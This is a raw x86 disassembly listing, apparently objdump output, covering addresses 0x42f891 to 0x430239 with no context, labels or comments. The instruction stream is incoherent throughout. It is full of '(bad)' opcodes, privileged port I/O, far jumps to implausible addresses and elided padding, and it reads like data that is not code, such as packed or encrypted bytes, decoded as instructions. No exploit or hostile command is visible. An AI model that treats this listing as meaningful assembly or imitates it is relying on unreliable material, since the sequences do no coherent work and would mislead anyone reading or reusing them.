  42f891:	mov    edi,0xa4f117e8
  42f896:	mov    ds:0x549cb611,eax
  42f89b:	sub    al,0x9c
  42f89d:	clc    
  42f89e:	(bad)  
  42f89f:	int3   
  42f8a0:	(bad)  
  42f8a1:	ja     0x42f8e3
  42f8a3:	pop    esp
  42f8a4:	adc    eax,0xab5c263a
  42f8a9:	fsubr  DWORD PTR [edx-0x41]
  42f8ac:	and    al,0x9f
  42f8ae:	aas    
  42f8af:	out    0xb1,al
  42f8b1:	dec    esi
  42f8b2:	fwait
  42f8b3:	sahf   
  42f8b4:	das    
  42f8b5:	add    ebp,DWORD PTR [esi-0x7b]
  42f8b8:	popf   
  42f8b9:	rol    BYTE PTR es:[esi-0x433a92e6],0xdc
  42f8c1:	ins    DWORD PTR es:[edi],dx
  42f8c2:	(bad)  
  42f8c3:	xor    DWORD PTR [esi-0x3c339989],esi
  42f8c9:	in     al,0xd4
  42f8cb:	mov    gs,ecx
  42f8cd:	arpl   WORD PTR [eax+0x2ee3ef2b],bp
  42f8d3:	test   edi,esp
  42f8d5:	stos   DWORD PTR es:[edi],eax
  42f8d6:	push   0x8012ec9a
  42f8db:	xor    al,0xee
  42f8dd:	xchg   ebp,eax
  42f8de:	push   edx
  42f8df:	pop    ecx
  42f8e0:	sub    eax,DWORD PTR ds:0x4495a978
  42f8e6:	lods   eax,DWORD PTR ds:[esi]
  42f8e7:	adc    BYTE PTR [ebp+edx*1-0x1f],dh
  42f8eb:	and    BYTE PTR [ebx],cl
  42f8ed:	and    bl,BYTE PTR [edx+0x70]
  42f8f0:	repz popf 
  42f8f2:	cdq    
  42f8f3:	add    BYTE PTR ds:[ecx+0x25],al
  42f8f7:	retf   
  42f8f8:	sbb    bh,ah
  42f8fa:	sbb    al,0xf2
  42f8fc:	mov    DWORD PTR [edi+ebx*2-0x3b],ebx
  42f900:	rcr    BYTE PTR [ebp+0x7b],cl
  42f903:	or     BYTE PTR [eax+0x75956e09],dh
  42f909:	lea    ecx,[eax+ebp*2]
  42f90c:	push   esi
  42f90d:	cmc    
  42f90e:	mov    ebx,DWORD PTR [eax-0x48cec1a6]
  42f914:	aad    0xf
  42f916:	push   ss
  42f917:	mov    WORD PTR [eax-0x4],gs
  42f91a:	leave  
  42f91b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f91c:	push   edx
  42f91d:	dec    ecx
  42f91e:	(bad)  
  42f91f:	jmp    0xe3669f4f
  42f924:	dec    esi
  42f925:	test   al,0x6a
  42f927:	aad    0x4
  42f929:	pushf  
  42f92a:	inc    edx
  42f92b:	outs   dx,BYTE PTR ds:[esi]
  42f92c:	scas   al,BYTE PTR es:[edi]
  42f92d:	fiadd  DWORD PTR [edi+ecx*8+0x2c]
  42f931:	ret    0x3409
  42f934:	xchg   esi,eax
  42f935:	inc    ecx
  42f936:	jp     0x42f926
  42f938:	sbb    al,0x67
  42f93a:	in     eax,dx
  42f93b:	(bad)  
  42f93c:	mov    eax,ds:0x302603b6
  42f941:	mov    ebx,0x474afcae
  42f946:	mov    ebx,0xf04b139
  42f94b:	dec    esp
  42f94c:	sub    al,0xcf
  42f94e:	jb     0x42f9c0
  42f950:	sub    eax,ebx
  42f952:	cwde   
  42f953:	cdq    
  42f954:	inc    edx
  42f955:	sti    
  42f956:	pop    ebp
  42f957:	xor    ebx,DWORD PTR [ebx]
  42f959:	cdq    
  42f95a:	add    edx,DWORD PTR [ebx-0x7afe70aa]
  42f960:	into   
  42f961:	repnz aam 0xdf
  42f964:	(bad)  
  42f965:	into   
  42f966:	push   0xffffffa7
  42f968:	gs xor al,0x8b
  42f96b:	add    ebp,edx
  42f96d:	mov    DWORD PTR [eax],eax
	...
  42f9d3:	add    BYTE PTR [eax],al
  42f9d5:	add    BYTE PTR [esp+esi*2],dl
  42f9d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f9d9:	push   ebp
  42f9da:	in     al,0xd5
  42f9dc:	cmc    
  42f9dd:	jne    0x42f98a
  42f9df:	sbb    cl,dh
  42f9e1:	js     0x42f96c
  42f9e3:	test   DWORD PTR [ecx-0x80],edi
  42f9e6:	inc    BYTE PTR [bx+di]
  42f9e9:	add    BYTE PTR [eax],al
  42f9eb:	add    DWORD PTR [eax],eax
  42f9ed:	add    BYTE PTR [ebx-0x39335bf3],bl
  42f9f3:	inc    ebx
  42f9f4:	mov    al,0x1c
  42f9f6:	dec    ecx
  42f9f7:	mov    bl,BYTE PTR [ebp-0x7a0e2546]
  42f9fd:	sub    al,0x3a
  42f9ff:	or     al,0xad
  42fa01:	jnp    0x42f9d6
  42fa03:	clc    
  42fa04:	push   eax
  42fa05:	xor    eax,0x76680dd5
  42fa0a:	push   ebp
  42fa0b:	outs   dx,DWORD PTR ds:[esi]
  42fa0c:	popf   
  42fa0d:	ins    DWORD PTR es:[edi],dx
  42fa0e:	or     ah,BYTE PTR [esi+esi*2]
  42fa11:	jge    0x42fa6f
  42fa13:	jp     0x42fa53
  42fa15:	mov    edi,0x9d92f03c
  42fa1a:	or     bl,bl
  42fa1c:	je     0x42fa9a
  42fa1e:	iret   
  42fa1f:	pop    esi
  42fa20:	push   edx
  42fa21:	mul    dh
  42fa23:	jns    0x42fa82
  42fa25:	int3   
  42fa26:	cmp    DWORD PTR [esi],ebx
  42fa28:	ins    DWORD PTR es:[edi],dx
  42fa29:	mov    bl,0x1d
  42fa2b:	sbb    eax,0x2a725f58
  42fa30:	jmp    DWORD PTR [ebx-0x47]
  42fa33:	cwde   
  42fa34:	shl    DWORD PTR [ebp-0x31420ef2],1
  42fa3a:	repnz sahf 
  42fa3c:	pop    ecx
  42fa3d:	setno  BYTE PTR [ebp-0x1821bc3a]
  42fa44:	imul   edx,DWORD PTR [edi],0x96190eb8
  42fa4a:	aas    
  42fa4b:	sub    dh,dl
  42fa4d:	sub    BYTE PTR [edx],bl
  42fa4f:	add    eax,0x4a90282
  42fa54:	(bad)  
  42fa55:	retf   0xad2f
  42fa58:	jg     0x42fa5e
  42fa5a:	adc    al,0x68
  42fa5c:	inc    ebp
  42fa5d:	ja     0x42fa6e
  42fa5f:	sbb    ebp,DWORD PTR [esi-0x4e]
  42fa62:	nop
  42fa63:	retf   
  42fa64:	test   BYTE PTR ds:0x670b2c5f,0xa5
  42fa6b:	(bad)  
  42fa6c:	or     DWORD PTR [ebx-0x2d236dbb],ebx
  42fa72:	mul    BYTE PTR [esi+0x1b]
  42fa75:	stos   BYTE PTR es:[edi],al
  42fa76:	sbb    eax,0x144f0df9
  42fa7b:	(bad)  
  42fa7c:	into   
  42fa7d:	in     eax,dx
  42fa7e:	cli    
  42fa7f:	inc    esi
  42fa80:	jne    0x42fad5
  42fa82:	inc    edx
  42fa83:	test   BYTE PTR [eax],bh
  42fa85:	popa   
  42fa86:	std    
  42fa87:	icebp  
  42fa88:	inc    edx
  42fa89:	jno    0x42fa47
  42fa8b:	stc    
  42fa8c:	jmp    0x436d06c4
  42fa91:	enter  0x8bf9,0x6f
  42fa95:	push   cs
  42fa96:	inc    eax
  42fa97:	add    ecx,DWORD PTR [ebp-0x2]
  42fa9a:	mov    DWORD PTR [eax+eiz*8],edi
  42fa9d:	xchg   edi,eax
  42fa9e:	mov    ds:0xef17e12d,al
  42faa3:	std    
  42faa4:	inc    ebp
  42faa5:	push   es
  42faa6:	aad    0x32
  42faa8:	(bad)  
  42faa9:	cmp    eax,0x6d644e0a
  42faae:	xchg   esp,eax
  42faaf:	xlat   BYTE PTR ds:[ebx]
  42fab0:	lock sbb eax,0xc7443081
  42fab6:	popf   
  42fab7:	adc    al,0xd3
  42fab9:	mov    ebp,ecx
  42fabb:	repz bound esi,QWORD PTR [eax+0x6deccef4]
  42fac2:	lahf   
  42fac3:	mov    bl,0x78
  42fac5:	enter  0xcc5,0xc5
  42fac9:	cwde   
  42faca:	adc    edi,DWORD PTR ds:0xf859390d
  42fad0:	out    dx,al
  42fad1:	mov    BYTE PTR [ebx+edi*8],al
  42fad4:	inc    ebx
  42fad5:	enter  0xd6b8,0x6a
  42fad9:	cmp    DWORD PTR [ecx+edx*1+0x454b4720],edi
  42fae0:	push   ecx
  42fae1:	clc    
  42fae2:	fadd   DWORD PTR [ebx-0x5f0f269f]
  42fae8:	mov    cl,0x15
  42faea:	dec    esp
  42faeb:	push   0x12
  42faed:	mov    DWORD PTR [eax],eax
	...
  42fb53:	add    BYTE PTR [eax],al
  42fb55:	add    BYTE PTR [ebx],bl
  42fb57:	out    dx,eax
  42fb58:	shl    BYTE PTR [esi],0xf4
  42fb5b:	aas    
  42fb5c:	(bad)  
  42fb5d:	out    dx,eax
  42fb5e:	int3   
  42fb5f:	mov    WORD PTR [edi+0x32],?
  42fb62:	out    0xe3,eax
  42fb64:	inc    edi
  42fb65:	push   ecx
  42fb66:	inc    DWORD PTR [bx+di]
  42fb69:	add    BYTE PTR [eax],al
  42fb6b:	add    DWORD PTR [eax],eax
  42fb6d:	add    BYTE PTR [ecx-0x722b0a2],dl
  42fb73:	dec    ebx
  42fb74:	repnz aas 
  42fb76:	loope  0x42fb23
  42fb78:	(bad)
  42fb7c:	mov    ebp,0xf1ee527
  42fb81:	jae    0x42fb69
  42fb83:	add    al,0x6b
  42fb85:	inc    eax
  42fb86:	cdq    
  42fb87:	push   0xffffffb4
  42fb89:	(bad)  ds:0xe2e21736
  42fb8f:	mov    bl,0xd3
  42fb91:	xor    eax,0xa2d5b684
  42fb96:	or     DWORD PTR ds:0xae54d5d,ecx
  42fb9c:	push   eax
  42fb9d:	fwait
  42fb9e:	xchg   edx,eax
  42fb9f:	lods   eax,DWORD PTR ds:[esi]
  42fba0:	pop    ss
  42fba1:	cmp    eax,DWORD PTR [edi-0x54]
  42fba4:	js     0x42fb5b
  42fba6:	or     DWORD PTR [edi],eax
  42fba8:	adc    eax,0xdd46fb35
  42fbad:	(bad)
  42fbb0:	lahf   
  42fbb1:	out    dx,al
  42fbb2:	test   al,0x16
  42fbb4:	mov    dh,0x58
  42fbb6:	jo     0x42fb98
  42fbb8:	arpl   WORD PTR [ecx+0x3d],cx
  42fbbb:	test   BYTE PTR [esi+0x4e],ah
  42fbbe:	dec    esp
  42fbbf:	inc    esi
  42fbc0:	(bad)  
  42fbc1:	mov    al,ds:0x26aab60a
  42fbc6:	cmp    al,0x55
  42fbc8:	cs jg  0x42fc49
  42fbcb:	add    bl,0x9a
  42fbce:	sub    ch,BYTE PTR [eax+0x1050ad37]
  42fbd4:	div    DWORD PTR [ecx-0x3163e7fb]
  42fbda:	imul   esp,DWORD PTR [eax-0x4b],0x58b9b46
  42fbe1:	adc    al,0xa
  42fbe3:	mov    esi,0xf58e0b74
  42fbe8:	aam    0xc7
  42fbea:	jae    0x42fbc8
  42fbec:	jno    0x42fc49
  42fbee:	cmp    al,0xf2
  42fbf0:	addr16 dec ecx
  42fbf2:	gs cmp eax,edx
  42fbf5:	adc    BYTE PTR [edx-0x25c7241c],dl
  42fbfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fbfc:	cs cmp al,0xb3
  42fbff:	arpl   WORD PTR [edx+0x3],dx
  42fc02:	inc    esp
  42fc03:	je     0x42fc52
  42fc05:	jno    0x42fc65
  42fc07:	jne    0x42fbcb
  42fc09:	lds    ecx,FWORD PTR [edx-0x68b53d4]
  42fc0f:	rol    BYTE PTR [ebx+0x7a],cl
  42fc12:	inc    esi
  42fc13:	mov    edi,0x7128d9ba
  42fc18:	repz xor dl,BYTE PTR [eax-0x20]
  42fc1c:	cdq    
  42fc1d:	dec    eax
  42fc1e:	leave  
  42fc1f:	sti    
  42fc20:	mov    ds:0x86a71861,al
  42fc25:	pushf  
  42fc26:	loopne 0x42fbef
  42fc28:	test   esi,0xa2770300
  42fc2e:	int    0x4e
  42fc30:	pop    ss
  42fc31:	in     al,dx
  42fc32:	jo     0x42fc2a
  42fc34:	pusha  
  42fc35:	test   eax,0x5dfe2ac
  42fc3a:	stc    
  42fc3b:	jmp    0x1d476c3a
  42fc40:	mov    al,0x59
  42fc42:	mov    WORD PTR [edi-0x6d],?
  42fc45:	fsubr  st(2),st
  42fc47:	retf   0xe462
  42fc4a:	lods   al,BYTE PTR ds:[esi]
  42fc4b:	data16 sbb bh,BYTE PTR [ecx-0x6e]
  42fc4f:	mov    ebx,0xed19a309
  42fc54:	push   ss
  42fc55:	adc    esp,DWORD PTR [ecx+eiz*8+0x6f513092]
  42fc5c:	cmp    esp,0xffffff9f
  42fc5f:	pop    eax
  42fc60:	retf   0xb25
  42fc63:	fst    QWORD PTR [edi+edi*4-0x36]
  42fc67:	pop    ds
  42fc68:	ds mov bl,0xe4
  42fc6b:	add    BYTE PTR [ebx+0x2f],dh
	...
  42fcd6:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fcdc:	mov    ebx,0x36325e9a
  42fce1:	and    ch,dh
  42fce3:	and    DWORD PTR [esi+0x8],edi
  42fce6:	add    BYTE PTR [bp+si],al
  42fce9:	add    BYTE PTR [eax],al
  42fceb:	add    DWORD PTR [eax],eax
  42fced:	add    BYTE PTR [eax-0x5645944f],dl
  42fcf3:	test   BYTE PTR [edi-0x1d4b610e],bl
  42fcf9:	aam    0x33
  42fcfb:	and    eax,0xd0373675
  42fd00:	xchg   BYTE PTR [eax+0x45],ah
  42fd03:	pushf  
  42fd04:	dec    ebp
  42fd05:	xor    ebp,esi
  42fd07:	dec    edi
  42fd08:	nop
  42fd09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd0a:	scas   al,BYTE PTR es:[edi]
  42fd0b:	and    eax,0xfa38ff48
  42fd10:	xchg   edi,esi
  42fd12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd13:	gs cmp eax,0x508abcc2
  42fd19:	dec    esp
  42fd1a:	mov    ds:0x701ee7b9,eax
  42fd1f:	pop    ds
  42fd20:	into   
  42fd21:	ins    BYTE PTR es:[edi],dx
  42fd22:	xchg   ebp,eax
  42fd23:	and    al,0x68
  42fd25:	sbb    BYTE PTR [ecx-0x7b],dh
  42fd28:	inc    esp
  42fd29:	sbb    eax,0xeaff4785
  42fd2e:	pusha  
  42fd2f:	in     al,0xc4
  42fd31:	fdiv   DWORD PTR [esi-0x52]
  42fd34:	mov    dl,0x57
  42fd36:	jmp    0x42fd8c
  42fd38:	push   ecx
  42fd39:	sbb    edi,0xe542f11a
  42fd3f:	or     al,0x2c
  42fd41:	and    eax,0x7212b511
  42fd46:	hlt    
  42fd47:	add    ebx,ecx
  42fd49:	pushf  
  42fd4a:	xchg   esp,eax
  42fd4b:	mov    edi,0x8e7b94ff
  42fd50:	mov    al,ds:0xa2a5b5ee
  42fd55:	fcmovnbe st,st(2)
  42fd57:	fs ins BYTE PTR es:[edi],dx
  42fd59:	cs sti 
  42fd5b:	push   esp
  42fd5c:	sbb    BYTE PTR [esi],bh
  42fd5e:	inc    esi
  42fd5f:	popa   
  42fd60:	sbb    eax,0x268809d8
  42fd65:	or     eax,0x8833ebc3
  42fd6a:	int    0x75
  42fd6c:	fs pop ebp
  42fd6e:	and    eax,DWORD PTR [ebx]
  42fd70:	and    DWORD PTR [esi+0x2b],esi
  42fd73:	cdq    
  42fd74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fd75:	clc    
  42fd76:	mov    dl,0xb0
  42fd78:	mov    esi,0x6d7dd468
  42fd7d:	jnp    0x42fdf2
  42fd7f:	jb     0x42fd2b
  42fd81:	loopne 0x42fd99
  42fd83:	mov    eax,ds:0x663b3a83
  42fd88:	out    0xd5,al
  42fd8a:	ret    0x7366
  42fd8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fd8e:	loopne 0x42fe0c
  42fd90:	jno    0x42fd64
  42fd92:	stos   DWORD PTR es:[edi],eax
  42fd93:	imul   ebx,eax,0x1e
  42fd96:	inc    edi
  42fd97:	enter  0x8d3,0x5
  42fd9b:	(bad)  
  42fd9c:	psubq  mm3,mm0
  42fd9f:	repz rcl BYTE PTR [ecx+0x523fb270],0x8b
  42fda7:	push   edi
  42fda8:	lds    edi,FWORD PTR [esi]
  42fdaa:	mov    ecx,0x4712aabb
  42fdaf:	cmp    DWORD PTR [edi],0x352eb5c2
  42fdb5:	das    
  42fdb6:	push   0x85a10bb1
  42fdbb:	(bad)  
  42fdbc:	dec    esi
  42fdbd:	or     al,0x2d
  42fdbf:	push   edx
  42fdc0:	mov    dh,BYTE PTR [edx]
  42fdc2:	and    ecx,DWORD PTR [esp+ecx*2-0x3e5bbecb]
  42fdc9:	mov    bl,BYTE PTR [ebx-0xf]
  42fdcc:	(bad)  
  42fdcd:	push   ds
  42fdce:	or     eax,0x5b6eb793
  42fdd3:	pushf  
  42fdd4:	mov    edx,ecx
  42fdd6:	or     DWORD PTR [ebx-0x4b3a37b],ebx
  42fddc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fddd:	xor    al,0x2a
  42fddf:	outs   dx,BYTE PTR ds:[esi]
  42fde0:	sti    
  42fde1:	cmp    DWORD PTR [ebx+eiz*2+0x7ae2b9f4],0x38
  42fde9:	fs and eax,0xfa76e5
	...
  42fe53:	add    BYTE PTR [eax],al
  42fe55:	add    BYTE PTR [eax-0x40],cl
  42fe58:	ret    0xcaf0
  42fe5b:	bnd jp 0x42fe56
  42fe5e:	cmc    
  42fe5f:	inc    edx
  42fe60:	stos   BYTE PTR es:[edi],al
  42fe61:	repz (bad) 
  42fe63:	test   DWORD PTR [esi],0x20167b2
  42fe69:	add    BYTE PTR [eax],al
  42fe6b:	add    DWORD PTR [eax],eax
  42fe6d:	add    BYTE PTR [ecx+0xa0311c8],cl
  42fe73:	inc    ecx
  42fe74:	mov    eax,0xb07590de
  42fe79:	fst    st(1)
  42fe7b:	push   ebx
  42fe7c:	sahf   
  42fe7d:	adc    edi,eax
  42fe7f:	shr    DWORD PTR [esi-0x1a],cl
  42fe82:	shl    DWORD PTR [ecx+0x6a],cl
  42fe85:	(bad)  
  42fe86:	aas    
  42fe87:	dec    eax
  42fe88:	jns    0x42feb4
  42fe8a:	jo     0x42fed0
  42fe8c:	dec    edi
  42fe8d:	(bad)  
  42fe8e:	mov    edi,0xa60c095
  42fe93:	jbe    0x42fe2d
  42fe95:	pusha  
  42fe96:	xchg   ecx,eax
  42fe97:	xor    eax,0x65a3b8f
  42fe9c:	out    dx,al
  42fe9d:	adc    BYTE PTR [esi-0x1e947721],ah
  42fea3:	mov    edx,eax
  42fea5:	sahf   
  42fea6:	jecxz  0x42fe28
  42fea8:	ins    BYTE PTR es:[edi],dx
  42fea9:	xchg   ecx,eax
  42feaa:	dec    ecx
  42feab:	xchg   ebp,eax
  42feac:	(bad)  
  42fead:	(bad)  
  42feaf:	mov    esp,0xbb1ef0df
  42feb4:	mov    esi,0xd96fc93f
  42feb9:	push   ss
  42feba:	jle    0x42fec2
  42febc:	js     0x42fe79
  42febe:	cwde   
  42febf:	imul   esi,DWORD PTR [edi+0x1],0xe635fbc5
  42fec6:	fwait
  42fec7:	cmp    eax,0x9847c045
  42fecc:	sub    eax,0xab3052b9
  42fed1:	popa   
  42fed2:	sub    esp,DWORD PTR [eax]
  42fed4:	xchg   edi,eax
  42fed5:	and    ecx,DWORD PTR [ecx+0x4]
  42fed8:	mov    esi,0xbdccf12a
  42fedd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fede:	cmp    al,0x79
  42fee0:	rcl    BYTE PTR [edx],0xd8
  42fee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fee4:	pushf  
  42fee5:	add    DWORD PTR [edi+edi*2],esi
  42fee8:	cmp    eax,0xaf72233f
  42feed:	(bad)  
  42feee:	cmp    ch,ch
  42fef0:	pop    esi
  42fef1:	retf   0x40d8
  42fef4:	inc    esi
  42fef5:	sub    BYTE PTR ds:0x6a2bab9b,cl
  42fefb:	ds clc 
  42fefd:	dec    edx
  42fefe:	xchg   esi,eax
  42feff:	add    al,0xa8
  42ff01:	jmp    0x4a4dea3c
  42ff06:	adc    eax,0x105531af
  42ff0b:	cmp    al,0x9a
  42ff0d:	(bad)  
  42ff0e:	and    al,0xf7
  42ff10:	dec    edi
  42ff11:	scas   al,BYTE PTR es:[edi]
  42ff12:	or     BYTE PTR [ecx],ch
  42ff14:	int    0x8d
  42ff16:	pushf  
  42ff17:	fwait
  42ff18:	push   eax
  42ff19:	das    
  42ff1a:	or     BYTE PTR [ebp-0x12],ah
  42ff1d:	and    edx,ebp
  42ff1f:	cmp    eax,0x531cc625
  42ff24:	cdq    
  42ff25:	inc    eax
  42ff26:	adc    edx,0xffffffc9
  42ff29:	stc    
  42ff2a:	jmp    0x42ff72
  42ff2c:	mov    ch,0xb1
  42ff2e:	aas    
  42ff2f:	outs   dx,DWORD PTR ds:[esi]
  42ff30:	cmp    BYTE PTR [edi-0x59],0x35
  42ff34:	adc    bl,BYTE PTR [ebp-0x2]
  42ff37:	sbb    dh,BYTE PTR [ebx-0x4744cecc]
  42ff3d:	or     BYTE PTR [ebx],al
  42ff3f:	rol    DWORD PTR [ecx-0x18fc28f0],1
  42ff45:	cmp    al,0x6e
  42ff47:	int    0xd1
  42ff49:	clc    
  42ff4a:	xchg   ebx,eax
  42ff4b:	add    DWORD PTR [ebx+ecx*8+0x50],ebp
  42ff4f:	fadd   DWORD PTR [ebp-0x76]
  42ff52:	cmp    eax,edi
  42ff54:	test   DWORD PTR [ebx],ecx
  42ff56:	push   cs
  42ff57:	add    DWORD PTR [edx],eax
  42ff59:	jae    0x42fef1
  42ff5b:	mov    dl,BYTE PTR [ebp-0x42]
  42ff5e:	adc    ecx,eax
  42ff60:	pusha  
  42ff61:	sub    al,0x4f
  42ff63:	cmp    eax,0xb15da91f
  42ff68:	gs pop eax
  42ff6a:	test   eax,0xcd68
	...
  42ffd3:	add    BYTE PTR [eax],al
  42ffd5:	add    BYTE PTR [edi+eiz*2],al
  42ffd8:	std    
  42ffd9:	aaa    
  42ffda:	(bad)  
  42ffdb:	mov    edi,0x9ffa77ce
  42ffe0:	shl    DWORD PTR [eax+ecx*4-0x8],0x7b
  42ffe5:	das    
  42ffe6:	add    al,BYTE PTR [bp+si]
  42ffe9:	add    BYTE PTR [edi+0x33000000],dl
  42ffef:	ds mov esp,0x682385ad
  42fff5:	add    ch,BYTE PTR [edx]
  42fff7:	dec    esp
  42fff8:	dec    ecx
  42fff9:	stos   DWORD PTR es:[edi],eax
  42fffa:	cli    
  42fffb:	fisttp DWORD PTR cs:[edx]
  42fffe:	fs xchg ebp,eax
  430000:	call   0x388a:0x257e0ba5
  430007:	das    
  430008:	xchg   esp,eax
  430009:	jne    0x43002c
  43000b:	shl    BYTE PTR [eax+0x4a00e9f3],0xf6
  430012:	mov    ah,0xf6
  430014:	call   ebp
  430016:	aam    0x8d
  430018:	pop    ecx
  430019:	pusha  
  43001a:	xchg   bl,dh
  43001c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43001d:	fstp   DWORD PTR [edx+ebx*1-0x72]
  430021:	adc    edi,DWORD PTR [eax]
  430023:	push   ecx
  430024:	test   eax,0xb907c1b1
  430029:	pop    ebp
  43002a:	inc    edi
  43002b:	add    ebx,ebx
  43002d:	repnz xor DWORD PTR [ebp-0x5d6b01f2],esi
  430034:	scas   al,BYTE PTR es:[edi]
  430035:	loopne 0x430048
  430037:	shl    BYTE PTR [eax],1
  430039:	lds    esp,FWORD PTR [ecx+esi*2+0x15eb0965]
  430040:	and    al,0xe
  430042:	push   ss
  430043:	cdq    
  430044:	xchg   edx,eax
  430045:	into   
  430046:	cbw    
  430048:	push   ebp
  430049:	jecxz  0x430063
  43004b:	add    esp,eax
  43004d:	or     DWORD PTR [edx],ebp
  43004f:	subps  xmm5,XMMWORD PTR [ebx-0x4b1ed20]
  430056:	lods   eax,DWORD PTR ds:[esi]
  430057:	push   edi
  430058:	add    eax,0x258bc406
  43005d:	js     0x4300a8
  43005f:	call   0x90891c46
  430064:	inc    edi
  430065:	cmp    eax,DWORD PTR [ebx+0x7c]
  430068:	mov    edi,0xf128a1e6
  43006d:	clc    
  43006e:	into   
  43006f:	dec    eax
  430070:	into   
  430071:	icebp  
  430072:	push   eax
  430073:	rol    BYTE PTR [ecx-0x6c],0x5
  430077:	mov    al,ds:0x268f2578
  43007c:	daa    
  43007d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43007e:	je     0x4300d4
  430080:	idiv   DWORD PTR [edi]
  430082:	shr    DWORD PTR [ecx+0x1d],0x0
	...
  4300d6:	dec    ebp
  4300d7:	push   ebp
  4300d8:	mov    DWORD PTR [ebx-0x7e9e13f8],ecx
  4300de:	mov    esp,ebp
  4300e0:	or     al,ah
  4300e2:	dec    ebp
  4300e3:	add    bh,al
  4300e5:	add    BYTE PTR [eax],cl
  4300e7:	add    BYTE PTR [eax],al
  4300e9:	mov    DWORD PTR [eax],0x3ff44545
  4300ef:	xor    DWORD PTR [eax],eax
  4300f1:	test   DWORD PTR [ebx-0x34070b64],ecx
  4300f7:	(bad)  
  4300f8:	enter  0x4d45,0xb8
  4300fc:	mov    esi,DWORD PTR [edx]
  4300fe:	hlt    
  4300ff:	test   ebx,ecx
  430101:	pushf  
  430102:	enter  0x4df8,0x8b
  430106:	mov    DWORD PTR [ebp+0x8],0x894708
  43010d:	inc    ebp
  43010e:	mov    ebp,0xff8bfffc
  430113:	dec    ebp
  430114:	mov    ch,0xf4
  430116:	call   DWORD PTR [ebx-0x1]
  430119:	mov    ebx,0x8005426
  43011e:	call   DWORD PTR [ecx+0x8]
  430121:	pop    es
  430122:	jmp    0xb8:0x9cb4533
  430129:	fwait
  43012a:	mov    esi,DWORD PTR [edx-0xc]
  43012d:	xor    al,bl
  43012f:	add    BYTE PTR [ebx+0x3c83203],bl
  430135:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  43013b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430141:	xor    eax,DWORD PTR [eax]
  430143:	retf   
  430144:	ret    
  430145:	add    eax,esi
  430147:	enter  0x8945,0x64
  43014b:	dec    ebp
  43014c:	sbb    ah,cl
  43014e:	add    BYTE PTR [ebx-0xb87b277],cl
  430154:	dec    DWORD PTR [ebx-0xbcfb275]
  43015a:	test   DWORD PTR [ebx],esi
  43015c:	dec    ebx
  43015e:	inc    DWORD PTR [ebx]
  430160:	inc    eax
  430161:	enter  0x8989,0x64
  430165:	(bad)  
  430166:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  43016a:	cld    
  43016b:	dec    DWORD PTR [ebp-0xa90001]
  430171:	push   edi
  430172:	mov    BYTE PTR [edx+0x1],ch
  430175:	and    DWORD PTR [eax],eax
  430177:	pop    ecx
  430178:	inc    ebp
  430179:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43017f:	push   0xffffff89
  430181:	pop    ecx
  430182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430183:	dec    ebp
  430184:	add    BYTE PTR [ecx+0x45fc088b],cl
  43018a:	jne    0x4301d5
  43018c:	lea    eax,[eax]
  43018e:	fs (bad) 
  430190:	dec    DWORD PTR [eax]
  430192:	mov    DWORD PTR [eax],eax
  430194:	test   al,0x0
  430196:	add    BYTE PTR [ebp-0x18],cl
  430199:	xor    ebp,DWORD PTR [edx]
  43019b:	add    eax,DWORD PTR [eax]
  43019d:	mov    eax,eax
  43019f:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4301a6:	inc    ebp
  4301a7:	mov    DWORD PTR [ebx+0x459408],ecx
  4301ad:	bound  ecx,QWORD PTR [ebx-0x372749b]
  4301b3:	inc    eax
  4301b4:	cmp    bh,0x1
  4301b7:	lea    eax,[eax]
  4301b9:	and    BYTE PTR [eax],al
  4301bb:	inc    DWORD PTR [ecx-0x18]
  4301be:	mov    ecx,DWORD PTR [ebx]
  4301c0:	cld    
  4301c1:	add    BYTE PTR [ecx+0x75014d],cl
  4301c7:	(bad)  
  4301c8:	xchg   ebp,eax
  4301c9:	sar    bh,1
  4301cb:	inc    eax
  4301cc:	inc    DWORD PTR [eax]
  4301ce:	mov    eax,DWORD PTR [ebp-0x4]
  4301d1:	xor    edx,DWORD PTR [edx+0x7201be]
  4301d7:	add    BYTE PTR [edx],dl
  4301d9:	(bad)  
  4301da:	nop
  4301db:	inc    ebp
  4301dc:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4301e2:	mov    al,0xff
  4301e4:	add    bh,bh
  4301e6:	add    BYTE PTR [ebx],dh
  4301e8:	inc    DWORD PTR [ebx]
  4301ea:	sbb    al,0x89
  4301ec:	jne    0x4301ca
  4301ee:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4301f4:	mov    eax,DWORD PTR [ebp-0xff0048]
  4301fa:	mov    DWORD PTR [eax-0x70],0xec70ed89
  430201:	inc    DWORD PTR [ebp-0x75]
  430204:	fisttp QWORD PTR [esi+ebp*8]
  430207:	test   DWORD PTR [esi-0x1],esp
  43020a:	inc    ebp
  43020b:	(bad)  
  43020c:	aas    
  43020d:	inc    ebp
  43020e:	(bad)  
  43020f:	lea    edi,[eax+edi*2-0x1]
  430213:	inc    edi
  430215:	mov    DWORD PTR ds:0x8000c7a0,edi
  43021b:	mov    ebp,esp
  43021d:	cld    
  43021e:	loop   0x4301ad
  430220:	inc    ebp
  430221:	(bad)  
  430222:	out    dx,al
  430223:	(bad)  
  430224:	fisttp WORD PTR [eax+0x8801c7]
  43022a:	jecxz  0x430271
  43022c:	in     al,dx
  43022d:	inc    DWORD PTR [ebp-0x4]
  430230:	out    0x8d,eax
  430232:	aas    
  430233:	(bad)  
  430234:	call   0xcb2d38
  430239:	add    DWORD PTR [ebx-0x7f490400],ecx
